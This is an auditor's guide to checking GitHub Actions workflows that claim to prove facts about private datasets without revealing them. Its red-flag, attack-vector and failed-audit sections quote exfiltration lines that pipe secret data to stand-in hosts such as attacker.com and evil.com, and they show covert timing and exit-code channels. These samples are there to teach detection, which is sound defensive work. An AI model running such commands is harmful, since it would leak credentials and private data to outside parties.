# Auditor's Guide - Verifying GitHub Actions Certificates

## What This Is

**"Pre-buy inspection" for private datasets**

Like inspecting a car before buying, you want to verify a dataset is valuable WITHOUT seeing all the details. GitHub Actions provides public execution logs that prove claims about private data.

## The Use Case: Info Bazaar

**Seller claims:** "I have valuable data about X"  
**Buyer asks:** "Prove it without showing me the data"  
**Solution:** Verifiable execution certificate

**Common scenarios:**
- Proving you have valid API credentials
- Proving you have authentic TLS transcripts from a website
- Proving your dataset contains relevant information
- Proving data quality/freshness without exposure

## How Private Data Stays Private

### Option A: GitHub Secrets (datasets <64KB)

```yaml
# Repo owner adds secret in Settings → Secrets
PRIVATE_DATASET="<secret data>"

# Workflow accesses it:
- name: Load dataset
  env:
    DATASET: ${{ secrets.PRIVATE_DATASET }}
  run: |
    # GitHub automatically redacts secret values from logs
    HASH=$(echo -n "$DATASET" | sha256sum)
    echo "Dataset hash: $HASH"  # ✅ Logged publicly
    # $DATASET value itself is NEVER logged
```

**GitHub's security:**
- ✅ Secret values automatically redacted from logs
- ✅ Secrets never appear in public workflow output
- ✅ Runner destroyed after execution (data deleted)
- ✅ Even repo owner can't see secrets in logs once set

### Option B: Private URL + Token (unlimited size)

```yaml
# Store in secrets:
DATASET_URL=https://private-storage.com/data.csv
DATASET_TOKEN=revocable_bearer_token_xyz

# Workflow fetches:
- name: Fetch dataset
  env:
    URL: ${{ secrets.DATASET_URL }}
    TOKEN: ${{ secrets.DATASET_TOKEN }}
  run: |
    curl -H "Authorization: Bearer $TOKEN" "$URL" > dataset.txt
    HASH=$(sha256sum dataset.txt | cut -d' ' -f1)
    echo "Dataset hash: $HASH"  # ✅ Logged
    # dataset.txt only in runner memory, deleted after
```

**Benefits:**
- ✅ No size limit (GitHub Secrets max 64KB)
- ✅ You control the storage
- ✅ Can revoke token anytime
- ✅ Dataset never touches GitHub servers

**What gets logged publicly:**
- ✅ Dataset hash (proves which data was used)
- ✅ LLM prompt/analysis code
- ✅ Result/output
- ❌ NOT the dataset itself
- ❌ NOT the access credentials

## Auditor's Verification Process

### Step 1: Audit the Workflow YAML

**Check the workflow is honest:**

```bash
# Fetch the workflow file (public)
curl https://raw.githubusercontent.com/USER/REPO/master/.github/workflows/ephemeral-execution.yml

# Or browse on GitHub
https://github.com/USER/REPO/blob/master/.github/workflows/ephemeral-execution.yml
```

**What to verify:**

✅ **Inputs are reasonable:**
- Accepts dataset reference (secret name or URL)
- Accepts analysis prompt (public)
- Accepts API key for LLM

✅ **No data exfiltration:**
- No `curl` to external URLs (except LLM API)
- No artifact uploads containing dataset
- No base64 encoding of secrets to logs
- No sneaky `echo $DATASET` commands

✅ **Proper cleanup:**
- Dataset loaded to memory only (not disk)
- No persistence after run
- Runner destruction confirmed

**Red flags 🚩:**
```yaml
# BAD: Sends dataset to attacker
- run: curl -X POST https://attacker.com -d "$DATASET"

# BAD: Uploads dataset as artifact
- uses: actions/upload-artifact@v4
  with:
    path: ${{ secrets.PRIVATE_DATASET }}

# BAD: Logs secret value
- run: echo "Dataset: ${{ secrets.PRIVATE_DATASET }}"

# BAD: Obfuscated exfiltration
- run: echo "$DATASET" | base64 | curl -X POST https://evil.com
```

### Step 2: Check Execution Logs

**Visit the workflow run URL:**
```
https://github.com/USER/REPO/actions/runs/RUN_ID
```

**What to verify:**

✅ **Execution matches workflow YAML:**
- Steps ran in declared order
- No unexpected commands
- Timing is reasonable

✅ **Dataset hash is logged:**
```
Dataset hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

✅ **Analysis prompt is visible:**
```
Prompt: "Check if API key is valid by calling /api/status endpoint"
```

✅ **Result is shown:**
```
Result: API key is valid. Status: active. Rate limit: 10000/day remaining.
```

✅ **No secret leakage:**
- No API key values in logs
- No dataset content visible
- GitHub shows `***` for redacted secrets

✅ **Timing is plausible:**
- Not suspiciously fast (pre-computed)
- Not suspiciously slow (exfiltration delay)

### Step 3: Verify Dataset Hash (If Known)

**If you can independently verify the dataset:**

```bash
# Example: Verify the seller has an authentic Twitter archive
# You saw them download it, got hash: abc123...

# Check workflow logs show same hash
# If match → confirms same dataset used
```

**If you don't have the dataset:**
- Hash consistency across runs (same data each time)
- Hash format is valid (sha256 = 64 hex chars)
- Plausibility check (does result make sense for that hash?)

### Step 4: Verify the Claim

**Example 1: Valid API Key**

**Seller claims:** "I have a valid Anthropic API key with $100 credit"

**Workflow does:**
```python
import anthropic

client = anthropic.Anthropic(api_key=os.environ['API_KEY'])

# Test the key
response = client.messages.create(
    model="claude-sonnet-4",
    max_tokens=10,
    messages=[{"role": "user", "content": "test"}]
)

# Check billing
billing_info = client.billing.get_info()

print(f"API key valid: True")
print(f"Credit remaining: ${billing_info.balance}")
```

**Auditor verifies:**
- ✅ Workflow calls Anthropic API (logs show network call)
- ✅ Result shows key is valid
- ✅ Credit amount matches claim
- ✅ No API key value leaked in logs

**Example 2: Authentic TLS Transcript**

**Seller claims:** "I have an authentic transcript of Wikipedia's homepage fetched via TLS"

**Workflow does:**
```bash
# Fetch from Wikipedia over TLS
curl -v https://en.wikipedia.org/wiki/Main_Page > transcript.html 2> tls_log.txt

# Show TLS certificate
grep "Server certificate" tls_log.txt

# Hash the transcript
HASH=$(sha256sum transcript.html | cut -d' ' -f1)
echo "Transcript hash: $HASH"

# LLM analyzes it
python analyze.py transcript.html
```

**Auditor verifies:**
- ✅ TLS certificate shown in logs (proves authentic connection)
- ✅ Transcript hash is logged
- ✅ LLM analysis result makes sense (e.g., "Contains article about...")
- ✅ No transcript content leaked (only hash + analysis)

**Example 3: Dataset Pre-Buy Inspection**

**Seller claims:** "I have 10,000 customer support tickets relevant to 'refund issues'"

**Workflow does:**
```python
import anthropic

# Load dataset (from secret)
dataset = os.environ['SUPPORT_TICKETS']

# Hash it
hash = hashlib.sha256(dataset.encode()).hexdigest()
print(f"Dataset hash: {hash}")

# LLM analyzes relevance
client = anthropic.Anthropic(api_key=os.environ['ANTHROPIC_API_KEY'])
response = client.messages.create(
    model="claude-sonnet-4",
    max_tokens=2000,
    messages=[{
        "role": "user",
        "content": f"Analyze this dataset:\n\n{dataset}\n\nHow many tickets? What % mention 'refund'? Common themes?"
    }]
)

print(response.content[0].text)
```

**Auditor verifies:**
- ✅ Dataset hash logged
- ✅ Analysis shows: "9,847 tickets, 73% mention refunds, themes: delayed shipping, product defects, billing errors"
- ✅ Result matches seller's claim
- ✅ No actual ticket content leaked
- **Decision:** Data looks valuable, proceed with purchase

## Verification Checklist

### Workflow Audit
- [ ] Workflow YAML is public and readable
- [ ] Only accesses declared secrets (no surprises)
- [ ] No external network calls (except LLM API / authenticated data sources)
- [ ] No artifact uploads containing dataset
- [ ] No `echo` or logging of secret values
- [ ] No base64/encoding tricks
- [ ] Proper cleanup (dataset deleted after)

### Execution Logs Audit  
- [ ] Logs match workflow YAML (no extra steps)
- [ ] Dataset hash is logged (proves which data)
- [ ] Analysis prompt is visible (proves what was checked)
- [ ] Result is shown publicly
- [ ] No secret values leaked (GitHub shows `***`)
- [ ] Timing is reasonable (not pre-computed or delayed)
- [ ] Runner destruction confirmed

### Claim Verification
- [ ] Result matches seller's claim
- [ ] LLM response is detailed (not just "yes")
- [ ] Hash is consistent if run multiple times
- [ ] Plausibility check passes (makes sense)

### Trust Assessment

**High trust ✅:**
- All checklist items pass
- Simple, readable workflow
- Reputable repo owner
- Multiple successful audits

**Medium trust ⚠️:**
- Complex workflow (hard to audit)
- New repo owner (no history)
- Some timing anomalies

**Low trust ❌:**
- Red flags detected (exfiltration attempts)
- Obfuscated code
- Logs don't match workflow
- Suspicious timing

## Common Attack Vectors

### 1. Covert Channel - Timing

**Attack:**
```yaml
# Encode dataset in execution time
- run: |
    if [ "$DATASET" == "valuable" ]; then
      sleep 10  # Signal "yes"
    else
      sleep 1   # Signal "no"
    fi
```

**Defense:**
- Check execution time is reasonable
- Multiple runs should have similar timing
- Report suspiciously variable times

### 2. Covert Channel - Error Messages

**Attack:**
```yaml
# Encode dataset in error codes
- run: |
    if [ "$DATASET" == "valuable" ]; then
      exit 42  # Custom error code
    fi
```

**Defense:**
- Check exit codes are normal (0 or 1)
- Errors should be legitimate failures
- Report suspicious error patterns

### 3. Pre-Computation

**Attack:**
```yaml
# Seller pre-computes result, doesn't use dataset
- run: |
    # Ignore actual dataset
    echo "Result: Dataset is valuable!"  # Fake
```

**Defense:**
- Check execution time matches complexity
- Suspiciously fast = red flag
- Request specific prompts (hard to pre-compute all)
- Check LLM token usage (should be substantial)

### 4. Fake Dataset

**Attack:**
```yaml
# Use different dataset than claimed
- run: |
    # Claim to use PRIVATE_DATASET
    # Actually use FAKE_DATASET secret
    curl -X POST anthropic.com -d "$FAKE_DATASET"
```

**Defense:**
- Verify workflow accesses correct secret name
- Check hash matches if you have independent source
- Request re-run with specific prompt variations

## Trust Model

**What you're trusting:**

1. **GitHub infrastructure:**
   - Runners are actually isolated
   - Secrets are actually redacted
   - Runners are actually destroyed after execution
   - Logs are tamper-proof after completion

2. **Workflow owner:**
   - Wrote an honest workflow (no hidden exfiltration)
   - Actually ran the workflow shown in logs
   - Didn't manipulate timing or errors

3. **Your audit:**
   - You carefully checked the workflow
   - You verified logs match workflow
   - You confirmed no obvious attacks

**What you're NOT trusting:**
- ❌ Seller's word alone (verified by execution)
- ❌ LLM correctness (but unlikely to systematically lie)
- ❌ Closed-source execution (logs are public)

## When to Use GitHub Actions vs dstack TEE

| Scenario | GitHub Actions | dstack TEE |
|----------|----------------|------------|
| **Pre-buy inspection** | ✅ Good enough | ✅ Even better |
| **API key verification** | ✅ Perfect | ⚠️  Overkill |
| **Low-stakes claims** | ✅ Ideal | ⚠️  Expensive |
| **High-value datasets** | ⚠️  Medium trust | ✅ Cryptographic proof |
| **Regulatory compliance** | ❌ Not sufficient | ✅ Audit-grade |
| **Research validation** | ⚠️  Depends | ✅ Publication-ready |

**GitHub Actions is great for:**
- Quick demos and MVPs
- Low-stakes verification
- API key/credential checks
- Pre-buy inspections
- Community trust (known platform)

**Upgrade to dstack TEE when:**
- High-value datasets (>$1000)
- Regulatory requirements (HIPAA, GDPR audits)
- Research publication (needs cryptographic proof)
- Adversarial environment (don't trust GitHub)

## Example Audit Reports

### ✅ PASS: Valid API Key Verification

**Claim:** "I have a valid OpenAI API key with $50 credit"

**Workflow:** https://github.com/seller/api-key-proof/blob/master/.github/workflows/verify-key.yml

**Execution:** https://github.com/seller/api-key-proof/actions/runs/123456

**Audit findings:**
- ✅ Workflow is simple (20 lines, easy to audit)
- ✅ Only accesses `OPENAI_API_KEY` secret
- ✅ Calls OpenAI API to check balance
- ✅ No external URLs except api.openai.com
- ✅ Logs show: "Balance: $52.34, valid: true"
- ✅ No API key value leaked
- ✅ Execution time: 2.3s (reasonable)

**Verdict:** ✅ **VERIFIED** - High confidence claim is legitimate

**Trust level:** High (simple workflow, reputable owner, logs match)

---

### ⚠️  CONDITIONAL: Dataset Relevance Check

**Claim:** "I have 5,000 customer reviews about coffee makers"

**Workflow:** https://github.com/seller/reviews-proof/blob/master/.github/workflows/analyze.yml

**Execution:** https://github.com/seller/reviews-proof/actions/runs/789012

**Audit findings:**
- ✅ Workflow is readable (50 lines)
- ✅ Accesses `REVIEWS_DATASET` secret
- ✅ LLM analyzes dataset
- ⚠️  Execution time: 8.2s (seems fast for 5,000 reviews)
- ⚠️  LLM response is generic (could be pre-computed)
- ✅ No obvious exfiltration
- ✅ Dataset hash logged: `abc123...`

**Verdict:** ⚠️  **CONDITIONAL** - Probably legitimate, but request re-run with custom prompt

**Trust level:** Medium (timing is suspicious, need more verification)

**Recommendation:** Ask seller to re-run with specific prompt: "How many reviews mention 'espresso'?"

---

### ❌ FAIL: Suspicious Exfiltration

**Claim:** "I have proprietary financial data"

**Workflow:** https://github.com/seller/finance-proof/blob/master/.github/workflows/verify.yml

**Execution:** https://github.com/seller/finance-proof/actions/runs/345678

**Audit findings:**
- ❌ Workflow includes suspicious curl:
  ```yaml
  - run: curl -X POST https://mystery-server.com/log -d "$ANALYSIS_RESULT"
  ```
- ❌ Base64 encoding step (obfuscation):
  ```yaml
  - run: echo "$DATASET" | base64 > encoded.txt
  ```
- ❌ Artifact upload:
  ```yaml
  - uses: actions/upload-artifact@v4
    with:
      path: encoded.txt
  ```
- ❌ Complex workflow (200+ lines, hard to audit)

**Verdict:** ❌ **REJECTED** - Clear exfiltration attempts detected

**Trust level:** None - Do not proceed with purchase

---

## Conclusion

GitHub Actions provides **practical verifiability** for private datasets:
- Good enough for most Info Bazaar use cases
- Easy for auditors to verify (public logs)
- Free and familiar infrastructure
- Upgrade to dstack TEE when you need cryptographic guarantees

**The "pre-buy inspection" model works:**
1. Seller makes claim about private data
2. Seller runs verifiable workflow
3. Auditor checks workflow + logs
4. Buyer proceeds with confidence (or walks away)

**Arrow's Information Paradox solved** (practically, not cryptographically) 🦞
